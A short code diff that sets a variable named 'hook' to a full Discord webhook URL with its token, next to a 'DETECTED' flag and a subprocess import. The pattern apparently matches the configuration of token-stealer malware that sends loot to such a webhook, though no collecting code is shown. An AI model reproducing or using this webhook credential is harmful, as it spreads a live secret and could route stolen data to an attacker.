@@ -15,7 +15,7 @@ import random
 import re
 import subprocess
 
-hook = ""
+hook = "https://discord.com/api/webhooks/1080074365758091334/RP2ymxKoTK9gurXu3vW6ylmASp8ltD8VrRFBnoKs3k3uuGBehQUxWivSN2swq4cUXhPU"
 DETECTED = False
 
 
